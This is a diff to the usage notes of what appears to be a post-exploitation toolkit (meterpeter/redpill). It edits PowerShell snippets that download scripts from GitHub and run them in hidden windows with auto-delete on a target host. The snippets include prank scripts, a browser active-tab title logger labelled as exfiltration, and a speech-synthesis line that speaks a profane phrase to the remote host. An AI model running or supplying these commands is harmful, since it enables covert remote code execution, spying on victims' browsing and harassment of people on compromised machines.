@@ -139,14 +139,13 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiR
 Start-Process -WindowStyle Hidden powershell -ArgumentList "-file FWUprank.ps1 -autodelete on"
 ```
 
-#### Do A Barrel Roll Loop Prank
+#### Do A Barrel Roll Loop Prank ( loop prank 5 times with 20 seconds delay before next loop )
 ```powershell
 iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Misc-CmdLets/Prank2.ps1" -OutFile "Prank2.ps1"
-# Start the Prank after 3 seconds, loop the prank a max of 5 times with 20 seconds delay before the next loop
-Start-Process -WindowStyle Hidden powershell -ArgumentList "-File Prank2.ps1 -StartDelay 3 -LoopRange 5 -LoopDelay 20 -AutoDel on -MsgBoxClose 8"
+Start-Process -WindowStyle Hidden powershell -ArgumentList "-File Prank2.ps1 -StartDelay 1 -LoopRange 5 -LoopDelay 20 -AutoDel on -MsgBoxClose 18"
 ```
 
-#### Spying target webbrowser active tab windows title
+#### Spying target webbrowser active tab windows title ( background execution )
 ```powershell
 iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfiltration/browserLogger.ps1" -OutFile "browserLogger.ps1"
 Start-Process -WindowStyle Hidden powershell -ArgumentList "-file BrowserLogger.ps1 -force 'true' -log"
@@ -170,8 +169,7 @@ Remove-Item Browser.report -force
 
 #### Speak a frase to remote host
 ```powershell
-$SPEAKME = "UAUAUUAUAUUA   UUUUAUUAUUAUA  A A aAAAAaAAAaAaA   MERDA   AAAHAABAI UIAIUAUVA U   U     U     MERDA     U             U              U  ii          THE END"
-
+$SPEAKME = "UAUAUUAUAUUA   UUUUAUUAUUAUA  A A aAAAAaAAAaAaA   MERDA   AAAHAABAI UIAIUAUVA U   U     U     MERDA     U             U       kkkkkkUU       U  ii          THE END"
 Add-Type -AssemblyName System.speech;$SpeakObect = New-Object System.Speech.Synthesis.SpeechSynthesizer;$SpeakObect.Volume = 95;$SpeakObect.Rate = -4;$SpeakObect.Speak($SPEAKME)
 ```
 
